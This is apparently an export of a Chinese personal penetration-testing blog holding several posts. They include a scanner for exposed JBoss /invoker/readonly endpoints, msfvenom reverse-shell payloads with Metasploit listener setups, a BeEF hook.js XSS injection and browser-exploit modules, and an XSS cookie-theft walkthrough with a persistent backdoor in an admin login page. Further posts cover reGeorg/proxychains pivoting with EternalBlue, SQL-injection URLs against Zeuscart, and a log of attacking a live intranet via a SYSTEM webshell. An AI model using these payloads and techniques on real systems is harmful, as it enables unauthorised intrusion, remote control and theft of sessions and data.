创建添加路径后写入的文本 while True: lines = file.readlines(100000) # 依次读取每行 if not lines: break for line in lines: newfile.write(line.replace('\\r\\n', u'/invoker/readonly\\r\\n')) # 在每行后面添加/invoker/readonly file.close() # 关闭文本 newfile.close() # 关闭文本 批量验证12345678910111213141516171819202122def yanzheng(): result = [] # 创建一个result的list集合 with open('D:/python源码/shodan爬虫添加.txt', 'r') as f: for line in f: result.append(list(line.strip('\\n').split(','))) # 读取每行将每一行放入result集合里面 for i, a in enumerate(result): if (i + 1) % 2 != 0: url = a[0] NETWORK_STATUS = True # 创建一个NETWORK_STATUS初始状态为ture try: r = requests.get(url) # 利用request模块get请求到网址 zt = r.status_code # 读取request返还的网页状态 except requests.exceptions.ConnectionError: # 如果请求超时跑出异常使得NETWORK_STATUS的状态变成false NETWORK_STATUS = False if zt == 500: # 判断网页状态如果等于500则存在漏洞 print (url + '可能存在漏洞') file = open('D:/python源码/可能存在漏洞.txt', 'a') file.write(url + '\\n') # 将存在漏洞的网址写入文本 elif NETWORK_STATUS == False: # 如果请求超时返还异常时，NETWORK_STATUS为false，就输出强求超时 print (url + '请求超时') else: # 其他情况则输出其他状态 print (url + '其他状态') 这个就不分析了，注释写得很清楚了，这个自己写了好一会，还请教了别人，真菜，嘤嘤嘤！！！附上运行的图： getshell这里getshell是利用工具的，看看是否可以理由漏洞拿下该网站。 工具就不发了，不太好。 附上完整源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445# _*_coding:utf-8_*_import requestsimport sysdef tianjia(): file = open(\"D:/python源码/shodan爬虫.txt\", \"r\", newline='\\r\\n') # 打开爬虫文本 newfile = open(\"D:/python源码/shodan爬虫添加.txt\", 'w', ) # 创建添加路径后写入的文本 while True: lines = file.readlines(100000) # 依次读取每行 if not lines: break for line in lines: newfile.write(line.replace('\\r\\n', u'/invoker/readonly\\r\\n')) # 在每行后面添加/invoker/readonly file.close() # 关闭文本 newfile.close() # 关闭文本def yanzheng(): result = [] # 创建一个result的list集合 with open('D:/python源码/shodan爬虫添加.txt', 'r') as f: for line in f: result.append(list(line.strip('\\n').split(','))) # 读取每行将每一行放入result集合里面 for i, a in enumerate(result): if (i + 1) % 2 != 0: url = a[0] NETWORK_STATUS = True # 创建一个NETWORK_STATUS初始状态为ture try: r = requests.get(url) # 利用request模块get请求到网址 zt = r.status_code # 读取request返还的网页状态 except requests.exceptions.ConnectionError: # 如果请求超时跑出异常使得NETWORK_STATUS的状态变成false NETWORK_STATUS = False if zt == 500: # 判断网页状态如果等于500则存在漏洞 print (url + '可能存在漏洞') file = open('D:/python源码/可能存在漏洞.txt', 'a') file.write(url + '\\n') # 将存在漏洞的网址写入文本 elif NETWORK_STATUS == False: # 如果请求超时返还异常时，NETWORK_STATUS为false，就输出强求超时 print (url + '请求超时') else: # 其他情况则输出其他状态 print (url + '其他状态')if __name__ == \"__main__\": tianjia() yanzheng()","categories":[{"name":"Python","slug":"Python","permalink":"/categories/Python/"}],"tags":[{"name":"python","slug":"python","permalink":"/tags/python/"}]},{"title":"Python爬虫初学","slug":"Python爬虫初学","date":"2018-09-29T04:00:00.000Z","updated":"2019-04-27T07:51:39.192Z","comments":true,"path":"2018/09/29/Python爬虫初学/","link":"","permalink":"/2018/09/29/Python%E7%88%AC%E8%99%AB%E5%88%9D%E5%AD%A6/","excerpt":"python+selenium 自动化爬虫。初写Python代码。","text":"python+selenium 自动化爬虫。初写Python代码。 fofa介绍FOFA是白帽汇推出的一款网络空间资产搜索引擎。它能够帮助用户迅速进行网络资产匹配、加快后续工作进程。例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等。 环境操作系统操作系统 Windows10 编译器pycharm 浏览器谷歌浏览器 Python版本Python3 代码分析写这个代码应该可以说是将手工的操作写成代码。可以这么理解吧，我把每一步分解写成代码。 打开网站12345# 打开浏览器# 教程：https://blog.csdn.net/trisyp/article/details/78688106driver = webdriver.Chrome() # selenium要和chromedriver版本相匹配,模拟打开浏览器,chromedriver.exe放在python安装目录下driver.get(\"https://i.nosec.org/login?service=http%3A%2F%2Ffofa.so%2Fusers%2Fservice\") # 打开网址driver.maximize_window() # 窗口最大化（无关紧要哈） 这一步模拟手工打开浏览器步骤。 模拟登陆1234567891011# 模拟登陆wait = WebDriverWait(driver, 10)username_input = wait.until(EC.presence_of_element_located((By.NAME, 'username'))) # 查找 账号框name=usernamepassword_input = wait.until(EC.presence_of_element_located((By.NAME, 'password'))) # 查找 密码框name=passwordsubmit = wait.until(EC.element_to_be_clickable((By.NAME, 'button'))) # 查找登录按钮username_input.send_keys('账号') # 输入账号time.sleep(1)password_input.send_keys('密码') # 输入密码time.sleep(1)submit.click() # 登录time.sleep(4) 分析一下怎么查找到登录框和登陆按钮的。 1username_input = wait.until(EC.presence_of_element_located((By.NAME, 'username'))) # 查找 账号框name=username 通过查找HTML源码页面内的name，判断name=username，查找到账号输入框。 密码输入框和登入按钮同理。 12.send_keys # 向输入框输入内容.click # 点击 搜索12345678# 搜索wait = WebDriverWait(driver, 10)query_input = wait.until(EC.presence_of_element_located((By.NAME, 'q'))) # 查找输入框name=qtime.sleep(1)query_input.send_keys('WordPress') # 搜索WordPresssubmit1 = wait.until(EC.presence_of_element_located((By.CLASS_NAME, 'search_tj'))) # 查找搜索按钮class=search_tjtime.sleep(4)submit1.click() 和模拟登陆的道理一样的，只不过搜索按钮是查找的元素是CLASS_NAME而已。 爬取前5页的内容因为fofa游客只能看前五页内容。 12345678910111213141516171819202122232425count = 0while count &lt; 5: count = count + 1 driver.current_url # 获取网页当前url time.sleep(3) # 强制等待3秒再执行下一步 driver.get(driver.current_url) # 获取网页源码 #解析目标网页的 Html 源码 html = driver.page_source soup = BeautifulSoup(html, 'html.parser') # 对网页源码进行处理 for news in soup.select('.list_mod'): # 搜索class=list_mod内的内容 ip = news.select('a')[0]['href'] # 搜索a href后的内容 print(ip) # 将内容写入文本 file = open('D:/python源码/fofa爬虫.txt', 'a') file.write(ip + '\\n') print (\"写进去了\") # 点击下一页 time.sleep(4) submit2 = wait.until(EC.presence_of_element_located((By.CLASS_NAME, 'next_page'))) # 查找下一页按钮 class=next_page time.sleep(4) submit2.click() # 点击下一页else: print (\"搞定了\") 写了一个while循环让它重复以下步骤知道爬取到第五页的时候停下。可以自己改判断的位置选择爬到多少页。 分析一下爬取内容的代码： 1driver.current_url # 获取网页当前url 此处调用了selenium模块获取当前页面的url，以获取当前网页的HTML源码，在这里写的时候遇到了一个坑，当时用的是request模块，导致翻到下一页的时候获取到了下一页的url以后但是获取到的html源码还是第一页的源码所以重复爬取了第一页的内容。 1driver.get(driver.current_url) # 获取网页源码 这里也是调用selenium模块获取当前网页的html源码，用了以后就不再是重复获取了第一页的html源码了。这里的 driver.page_source 意思是网页的全部 HTML 源码 123#解析目标网页的 Html 源码html = driver.page_source soup = BeautifulSoup(html, 'html.parser') 用BeautifulSoup4模块解析网页源码，这个过程就相当于右键的点击审查的过程。 123# 对网页源码进行处理for news in soup.select('.list_mod'): # 搜索class=list_mod内的内容 ip = news.select('a')[0]['href'] # 搜索a href后的内容 这里用图来做分析。注释哪里解释的很清楚了，可以自己按照这个教程做下实验，了解一下语法。https://blog.csdn.net/major_zhang/article/details/69658738 看下完整运行的样子！！！ 附上完整源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import requestsfrom bs4 import BeautifulSoupfrom selenium import webdriverfrom selenium.common.exceptions import TimeoutExceptionfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ECfrom pyquery import PyQuery as pqimport reimport osimport time# 打开浏览器# 教程：https://blog.csdn.net/trisyp/article/details/78688106driver = webdriver.Chrome() # selenium要和chromedriver版本相匹配,模拟打开浏览器,chromedriver.exe放在python安装目录下driver.get(\"https://i.nosec.org/login?service=http%3A%2F%2Ffofa.so%2Fusers%2Fservice\") # 打开网址driver.maximize_window() # 窗口最大化（无关紧要哈）# 模拟登陆wait = WebDriverWait(driver, 10)username_input = wait.until(EC.presence_of_element_located((By.NAME, 'username'))) # 查找 账号框name=usernamepassword_input = wait.until(EC.presence_of_element_located((By.NAME, 'password'))) # 查找 密码框name=passwordsubmit = wait.until(EC.element_to_be_clickable((By.NAME, 'button'))) # 查找登录按钮username_input.send_keys('账号') # 输入账号time.sleep(1)password_input.send_keys('密码') # 输入密码time.sleep(1)submit.click() # 登录time.sleep(4)# 搜索wait = WebDriverWait(driver, 10)query_input = wait.until(EC.presence_of_element_located((By.NAME, 'q'))) # 查找输入框name=qtime.sleep(1)query_input.send_keys('WordPress') # 搜索WordPresssubmit1 = wait.until(EC.presence_of_element_located((By.CLASS_NAME, 'search_tj'))) # 查找搜索按钮class=search_tjtime.sleep(4)submit1.click()# 爬取前5页的内容count = 0while count &lt; 5: count = count + 1 driver.current_url # 获取网页当前url time.sleep(3) # 强制等待3秒再执行下一步 driver.get(driver.current_url) # 获取网页源码 # 解析目标网页的 Html 源码 html = driver.page_source soup = BeautifulSoup(html, 'html.parser') # 对网页源码进行处理 for news in soup.select('.list_mod'): # 搜索class=list_mod内的内容 ip = news.select('a')[0]['href'] # 搜索a href后的内容 print(ip) # 将内容写入文本 file = open('D:/python源码/fofa爬虫.txt', 'a') file.write(ip + '\\n') print (\"写进去了\") # 点击下一页 time.sleep(4) submit2 = wait.until(EC.presence_of_element_located((By.CLASS_NAME, 'next_page'))) # 查找下一页按钮 class=next_page time.sleep(4) submit2.click() # 点击下一页else: print (\"搞定了\")","categories":[{"name":"Python","slug":"Python","permalink":"/categories/Python/"}],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"Metasploit后门","slug":"Metasploit后门","date":"2018-06-12T04:00:00.000Z","updated":"2019-03-08T07:30:14.966Z","comments":true,"path":"2018/06/12/Metasploit后门/","link":"","permalink":"/2018/06/12/Metasploit%E5%90%8E%E9%97%A8/","excerpt":"为了比赛，抓紧时间学习多种姿势。","text":"为了比赛，抓紧时间学习多种姿势。 受害机（Windows7）:192.168.61.168攻击机（kali）：192.168.61.123 后门生成1msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.61.123 LPORT=1234 R &gt;text.jsp 放入受害机 反弹连接的访问监听1234567msfconsoleuse exploit/multi/handlerset PAYLOAD java/jsp_shell_reverse_tcpset LHOST 192.168.61.123set LPORT 1234set ExitOnSession falseexploit -j -z 反弹shell访问192.168.61.169/text.jsp 会话弹回来了。 其他后门windows–&gt;使用模块“windows/meterpreter/reverse_tcp”命令：msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.61.123 LPORT=44444 X &gt;test.exe linux–&gt;使用模块“linux/x86/meterpreter/shell_rverse_tcp”命令：msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.61.123 LPORT=1234 X &gt;text java–&gt;使用模块“java/meterpreter/reverse_tcp”命令：msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.61.123 LPORT=1234 W &gt;text.jar php–&gt;使用模块“php/meterpreter/reverse_tcp”命令：msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.61.123 LPORT=1234 -f raw &gt;text.php asp–&gt;使用模块“windows/meterpreter/reverse_tcp”命令：msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.61.123 LPORT=1234 -f asp &gt; shell.asp aspx–&gt;使用模块“windows/meterpreter/reverse_tcp”命令：msfvenom -a x86 –platform win -p windows/meterpreter/reverse_tcp LHOST= 192.168.61.123 LPORT=7788 -f aspx x&gt; /home/niexinming/back.aspx android–&gt;使用模块“android/meterpreter/reverse_tcp”命令：msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.61.123 LPORT=1234 R &gt;text.apk 注意本地监听的确定用哪个payload：set payload windows/meterpreter/reverse_tcp 设置本地监听的端口：set lport 7788 设置本地的监听的地址：set lhost 0.0.0.0 运行：run 访问生成的反弹马 得到meterpreter的shell","categories":[{"name":"奇技淫巧","slug":"奇技淫巧","permalink":"/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"/tags/%E6%B8%97%E9%80%8F/"},{"name":"奇技淫巧","slug":"奇技淫巧","permalink":"/tags/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"},{"name":"内网渗透","slug":"内网渗透","permalink":"/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"XSS-BEEF浏览器劫持","slug":"XSS-BEEF浏览器劫持","date":"2018-06-11T16:00:00.000Z","updated":"2019-03-08T07:36:26.925Z","comments":true,"path":"2018/06/12/XSS-BEEF浏览器劫持/","link":"","permalink":"/2018/06/12/XSS-BEEF%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81/","excerpt":"写完去吃晚饭。","text":"写完去吃晚饭。 启动BEEF在kali里面打开一个终端输入以下指令。 12cd /usr/share/beef-xss/./beef 打开第二个网址，默认账号密码：beef beef xss攻击 到留言板去写入攻击代码。 1&lt;script src= \"http://192.168.61.171:3000/hook.js\"&gt;&lt;/script&gt; 老规矩，管理员同意公开。 浏览器劫持 普通用户访问留言板。 劫持到手。 执行恶意操作。 beef配合msfconsole拿到客户端shellms10_002_aurora 打开msfconsole 12345678910111213141516171819msfconsoleuse windows/browser/ms10_002_auroraset PAYLOAD windows/meterpreter/reverse_tcp ##TCP协议show options ##查看选项set SRVHOST 192.168.61.171 ##设置监听ipset SRVPORT 7777 ##设置监听端口set URIPATH/set LHOST 192.168.61.171 ##设置接收ipset LPORT 4444 ##设置接收端口run 劫持浏览器访问到这个地址。 访问成功 会话弹回来了。 ie_execcommand_uaf打开msfconsole 12345678910111213msfconsoleuse exploit/windows/browser/ie_execcmmand_uafshow optionsset SRVHOST 192.168.61.171set SRVPORT 8888set URIPATH/run 同样的操作就不截屏了。 和上面一样的，给你们看一个shell的回显行了。 xss漏洞扫描 常用工具： awvs 椰树 safe3 Xelenium w3af vega xss扫描插件+burp xss永久后门 将之前的xss的cookie劫持代码写入管理员后台登入界面的源码中即可。 xss平台搭建 这里不做演示，网上已经有教程了。 网址如下：https://blog.csdn.net/u011781521/article/details/53895363","categories":[{"name":"奇技淫巧","slug":"奇技淫巧","permalink":"/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"/tags/%E6%B8%97%E9%80%8F/"},{"name":"奇技淫巧","slug":"奇技淫巧","permalink":"/tags/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"}]},{"title":"XSS劫持cookie","slug":"XSS劫持cookie","date":"2018-06-09T16:00:00.000Z","updated":"2019-03-08T07:35:45.749Z","comments":true,"path":"2018/06/10/XSS劫持cookie/","link":"","permalink":"/2018/06/10/XSS%E5%8A%AB%E6%8C%81cookie/","excerpt":"吃完果以后有点反胃 ————————九指哥哥","text":"吃完果以后有点反胃 ————————九指哥哥 本地环境搭建源码和集成环境都给你们找好了。开心吧？省时省力。 asp小旋风链接：https://pan.baidu.com/s/10buCnQiU9NZgTDvrbAl2hg 密码：ydbz 测试源码链接：https://pan.baidu.com/s/1VQJ-M4t4J8WGsMFMOQn0eA 密码：rxde后台账号：admin 密码：admin 效果图： XSS漏洞测试要在后台设置一下先，不然测试不了。 找一句测试源码先： 1&lt;script&gt;alert('xss');&lt;/script&gt; 测试一下。 需要管理员审核才能发布。 发布以后访问一下首页。 弹窗成功。 cookie劫持找个免费的xss平台注册一个账号先。 http://xss.asgsec.cn 创建一个项目。 默认 查看代码 使用这条跨站劫持cookie代码 发表到留言板 管理员查看 cookie劫持到了 美滋滋！！！！！！！！ cookie使用打开啊D 访问后台未登入 载入劫持到的cookie 不需要账号密码，直接进入后台。","categories":[{"name":"奇技淫巧","slug":"奇技淫巧","permalink":"/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"/tags/%E6%B8%97%E9%80%8F/"},{"name":"奇技淫巧","slug":"奇技淫巧","permalink":"/tags/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"}]},{"title":"Ubuntu16.0.4安装使用docker","slug":"Ubuntu16.0.4安装使用docker","date":"2018-06-08T16:00:00.000Z","updated":"2019-03-08T07:36:52.446Z","comments":true,"path":"2018/06/09/Ubuntu16.0.4安装使用docker/","link":"","permalink":"/2018/06/09/Ubuntu16.0.4%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8docker/","excerpt":"参加完线下赛以后，没有任何体验感，但是多了很多感触，决定多做漏洞复现，从原理上理解漏洞。快速漏洞复现当然离不开docker啦。 ————————九指哥哥 妮妮镇楼。","text":"参加完线下赛以后，没有任何体验感，但是多了很多感触，决定多做漏洞复现，从原理上理解漏洞。快速漏洞复现当然离不开docker啦。 ————————九指哥哥 妮妮镇楼。 Ubuntu的安装这就不写了吧，一键式安装。 Ubuntu安装docker安装docker切换到root权限或者用sudo 123456789101112131415161718$ sudo apt-get update$ sudo apt-get install docker$ sudo apt-get install docker.io$ sudo apt-get install docker_registry$ sudo systemctl start docker$ sudo docker pull ubuntu:16.04$ sudo docker create ubuntu:16.04$ sudo docker run -i -t ubuntu:16.04 /bin/bash$ ls 使用docker漏洞复现1.下载靶场文件 这里是用p神一个靶场vulhub 1$ git clone https://github.com/vulhub/vulhub.git 如果提示没有git可以执行命令安装git 1$ yum install git 2.启动漏洞环境 docker-compose会自动查找当前目录下的配置文件（默认文件名为docker-compose.yml），并根据其内容编译镜像和启动容器。所以，要运行某个漏洞靶场，需要先进入该漏洞所在的目录。 1$ cd vulhub/joomla/CVE-2015-8562/ 直接执行如下命令，进行漏洞靶场的编译和运行： 1234# 可选$ sudo docker-compose build$ sudo docker-compose up -d 3.安装joomla 启动后访问http://your-ip:8080/即可看到Joomla的安装界面， 当前环境的数据库信息为： 1234数据库地址：mysql:3306用户：root密码：root数据库名：joomla 填入上述信息，正常安装即可。 漏洞库http://vulapps.evalbug.com/ 常用命令： 123456789打开/关闭/重启docker服务：sudo service docker start/stop/restart 查看镜像：docker imagesdocker ps：列出所有正在运行的容器docker image ls：列出所有的镜像docker stop &lt;name&gt;：暂停容器docker rm &lt;name&gt;：删除容器容器创建命令：$ docker run -d -p 445:445 medicean/vulapps:s_samba_1容器查询命令：$ docker ps -a","categories":[{"name":"奇技淫巧","slug":"奇技淫巧","permalink":"/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"/tags/%E6%B8%97%E9%80%8F/"},{"name":"奇技淫巧","slug":"奇技淫巧","permalink":"/tags/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"}]},{"title":"5.26渗透日志","slug":"5.26渗透日志","date":"2018-05-27T04:00:00.000Z","updated":"2019-11-06T07:05:00.040Z","comments":true,"path":"2018/05/27/5.26渗透日志/","link":"","permalink":"/2018/05/27/5.26%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/","excerpt":"好好练习，正好有一个system权限的webshell。目标：整个内网沦陷（搞不下就算了，不立flag）","text":"好好练习，正好有一个system权限的webshell。目标：整个内网沦陷（搞不下就算了，不立flag） 前期信息采集其实我觉得今天的顺序错了，也许现在也错了。搞得我现在system权限反而觉得自己什么都做不了。不管了，先按照这个顺序写了。 查看当前在线用户1query user 创建账户权限是system 没添加进管理组，不要问我为什么，我也不知道，应该是懒吧。 查看端口占用1netstat -ano 查看进程1Tasklist 肯定有杀软，我今天没看进程就开始怼，Scoks5代理搭建连接不上，3389端口复用也连不上。总之今天傻逼了。等我弄懂他的杀软是那个，我就kill掉它。 今天做的事不要问我干吗不lcx端口转发3389出来连接。我没有公网机器的事情也要跟你说？ Scoks5代理搭建方法跟前面的博客一样，但是搭建以后，发现nmap扫不了内网机器，懵逼，然后Windows代理连接上网试试，才发现问题。根本连不上 端口复用这里顺便把教程写了，不过我觉得它不好用，因为我本地复现的时候，理想的环境都连接的不稳定，但是还是要写的，万一你那时候用上了呢，反正我目前没用上。 使用方法： 上传源码包中文件夹webshell下的脚本至网站目录 然后本地进行连接上传的webshell即可 python proxy.py -u http://172.0.0.1/conn.php -l 1234 -r 3389 -v 这样就转发了webshell所在主机的3389到你本地的1234上，本地直接远程127.0.0.1:1234即可 python proxy.py -u http://172.0.0.1/conn.php -l 1234 -a 172.0.0.2 -r 3389 转发内网其他主机的端口，同上 python proxy.py -u http://172.0.0.1/conn.php -l 1234 -r 22 -v -s 转发SSH服务需要加上-s参数避免中断 TeamViewer内网连接链接：https://pan.baidu.com/s/1qc_EfPyHXrEWMGZ8PhNi2Q 密码：97cj 分享一下脚本链接先 我上传失败了，应该是被杀软杀了，所以会在这里写上使用教程。 本地复现教程写一下 12tv.exe -o c:\\1.txttype c:1.txt tv.exe -o c:\\1.txt type c:1.txt 连接一下 等我弄懂他杀软是那个先，我就kill掉他，我就不信拿不下了。 ——未完待续——","categories":[{"name":"渗透日志","slug":"渗透日志","permalink":"/categories/%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"reGeorg+proxychains内网渗透","slug":"reGeorg+proxychains内网渗透","date":"2018-05-13T16:00:00.000Z","updated":"2019-03-08T07:37:03.813Z","comments":true,"path":"2018/05/14/reGeorg+proxychains内网渗透/","link":"","permalink":"/2018/05/14/reGeorg+proxychains%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/","excerpt":"最近大家都在玩内网渗透，为了跟上脚步，我也不能落后。","text":"最近大家都在玩内网渗透，为了跟上脚步，我也不能落后。 受害机（server2003）:192.168.10.42攻击机（kali） reGeorg代理这个教程，我前面的文章就有了。不做解释。 1python reGeorgSocksProxy.py -u http://www.xxxxxxx.com/tunnel.aspx -p 1080 忽略xxxxxxx proxychains配置修改打开/etc/poxychains.conf修改[ProxyList]socks5 127.0.0.1 1080 攻击我在菜刀哪里看过，他存在192.168.10.42的内网机 通过proxychains进行namp扫描和ping 192.168.10.42 12proxychains nmap -Pn -sV 192.168.10.42proxychains ping 192.168.10.42 被拦截，嘤嘤嘤 内心表示不服为了验证这个方法是可以进行内网渗透的于是我做了本地复现 代理机（Windows2012）:192.168.61.138受害机（Windows2008）:192.168.61.100攻击机（Windows10） 搭理搭建成功以后，ping 192.168.61.100 和nmap扫192.168.61.100 ping不通了，但是nmap能扫扫。为什么ping不通呢，师兄给的解释是：ping是走的icmp协议socks代理不支持icmp协议。。。。而nmap有许多很多超级多的协议可以选择。 嘤嘤嘤~~我知道192.168.61.100有永恒之蓝的漏洞。msfconsole一波。 漏洞验证首先检查防火墙状态并关闭[root@admin ~]# proxychains msfconsole启动msf msf &gt; search eternalblue搜索模块 先扫描有漏洞主机msf &gt; use auxiliary/scanner/smb/smb_ms17_010加载扫描模块 msf &gt; set rhosts 192.168.61.1/24设置扫描IP直接扫描C段 msf &gt; run开始扫描 扫出提示： Host is likely VULNERABLE to MS17-010!的可以尝试利用 ms17攻击proxychains msfconsoleuse exploit/windows/smb/ms17_010_eternalblueshow optionsset RHOST 192.168.61.100exploit ——未完待续——","categories":[{"name":"渗透日志","slug":"渗透日志","permalink":"/categories/%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/"}],"tags":[{"name":"奇技淫巧","slug":"奇技淫巧","permalink":"/tags/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"}]},{"title":"铁三训练营之CVE-2015-2183 Zeuscart SQL注入漏洞","slug":"铁三训练营之CVE-2015-2183 Zeuscart SQL注入漏洞","date":"2018-05-08T16:00:00.000Z","updated":"2019-03-08T07:34:12.341Z","comments":true,"path":"2018/05/09/铁三训练营之CVE-2015-2183 Zeuscart SQL注入漏洞/","link":"","permalink":"/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCVE-2015-2183%20Zeuscart%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","excerpt":"CVE-2015-2183 Zeuscart SQL注入漏洞![](/images/铁三训练营之CVE-2015-2183 Zeuscart SQL注入漏洞/1.png)","text":"CVE-2015-2183 Zeuscart SQL注入漏洞![](/images/铁三训练营之CVE-2015-2183 Zeuscart SQL注入漏洞/1.png) 漏洞复现1.2访问【http://192.168.1.3/admin/】。如图2所示![](/images/铁三训练营之CVE-2015-2183 Zeuscart SQL注入漏洞/2.png) 1.3使用账户【admin】和密码【admin888】进行登录如图3所示![](/images/铁三训练营之CVE-2015-2183 Zeuscart SQL注入漏洞/3.png) 1.4访问【http://192.168.1.3/admin/?do=editcurrency&amp;cid=1】。如图4所示![](/images/铁三训练营之CVE-2015-2183 Zeuscart SQL注入漏洞/4.png) 1.5访问【http://192.168.1.3/admin/?do=editcurrency&amp;cid=1】,发现页面和前面页面不一样,说明当前页面存在注入。如图5所示![](/images/铁三训练营之CVE-2015-2183 Zeuscart SQL注入漏洞/5.png) 1.6访问【http:/192.168.1.3/admin/?do=editcurrency&amp;cid=1+order+by+5+–+】,发现页面正常。如图6所示![](/images/铁三训练营之CVE-2015-2183 Zeuscart SQL注入漏洞/6.png) 1.7访问【http://192.168.1.3/admin/?do= editcurrency&amp;cid=1+order+by+6+–+],发现页面和前面页面不一样,说明当前查询了5个字段。如图7所示![](/images/铁三训练营之CVE-2015-2183 Zeuscart SQL注入漏洞/7.png) 1.8访问【http://192.168.1.3/admin/?do=editcurrency&amp;cid=1+union+select+1,2,3,4,5+--+】,发现2和4回显了。如图8所示![](/images/铁三训练营之CVE-2015-2183 Zeuscart SQL注入漏洞/8.png) 1.9访问【http://192.168.1.3/admin/?do=editcurrency&amp;cid=1+union+select+l,user(),3,ersion(),5+--+】,查询当前的用户和版本。如图9所示![](/images/铁三训练营之CVE-2015-2183 Zeuscart SQL注入漏洞/9.png) 1.10访问【http://192.168.1.3/admin/?do=editcurrency&amp;cid=l+union+select+1,group_concat(schema_name),3,4,5+from+information_schema,schemata+--+】,查询当前的所有数据库。如图10所示![](/images/铁三训练营之CVE-2015-2183 Zeuscart SQL注入漏洞/10.png) 1.11在目标机中打开【C:\\phpstudy\\WWW\\admin\\classes\\Core\\Settings】下的【CurrencySettings.php】中的第182行,调用了editcurrency会找到showeditcurrency函数,然后判断是否接收cid参数,如果接收实例化Bin_Query类然后调用里面的executeQuery函数执行sql语句。如图11所示![](/images/铁三训练营之CVE-2015-2183 Zeuscart SQL注入漏洞/11.png) 1.12打开【C:\\phpstudy\\WWW\\Bin】下的【Query.php】中的第49行,可以看到执行sql语句并没有过滤。如图12所示![](/images/铁三训练营之CVE-2015-2183 Zeuscart SQL注入漏洞/12.png)","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"铁三训练营之CVE-2017-6823 Fiyo CMS权限提升","slug":"铁三训练营之CVE-2017-6823 Fiyo CMS权限提升","date":"2018-05-08T16:00:00.000Z","updated":"2019-03-08T07:34:09.653Z","comments":true,"path":"2018/05/09/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/","link":"","permalink":"/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCVE-2017-6823%20Fiyo%20CMS%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/","excerpt":"CVE-2017-6823 Fiyo CMS权限提升![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/1.png)","text":"CVE-2017-6823 Fiyo CMS权限提升![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/1.png) 1.2访问后台 【http://192.168.1.3/dapur/】。如图2所示![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/2.png) 1.3使用用户【admin】和密码【admin888】登录后台如图3所示![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/3.png) 1.4在左边选择Users下的New user,新建一个用户,用户名【xipu】密码【123456】电子邮箱【xipu@qq.com】UserGroup选择【Editor】NameLengkap姓名可以随便写。如图4所示![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/4.png) 1.5能看到各个组的leve等级。如图5所示![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/5.png) 1.6点击右上角的Administrator,点击【Sign Out】退出登录。如图6所示![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/6.png) 1.7使用刚创建的账号:Xipu,密码:123456登录。如图7所示![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/7.png) 1.8可以看到刚从哪个页面退出的就返回到刚才的页面不用管。可以看到左边的功能变得很少,没有操作用户的功能了。如图8所示![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/8.png) 1.9单击右上角的人头选择Edit profile编辑资料。如图9所示![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/9.png) 1.10点击 User Group看能否修改成管理员组,发现只能向下修改,并没有管理员的选项。如图10所示![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/10.png) 1.11单击“打开菜单”-&gt;“选项”,设置浏览器代理。如图11所示![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/11.png) 1.12单击“高级”-&gt;”网络”-&gt;“设置”,打开网络代理设置页面。如图12所示![](/images/铁三训练营之CVE-2017-6823 Fiyo CMS权限提升/12.png) 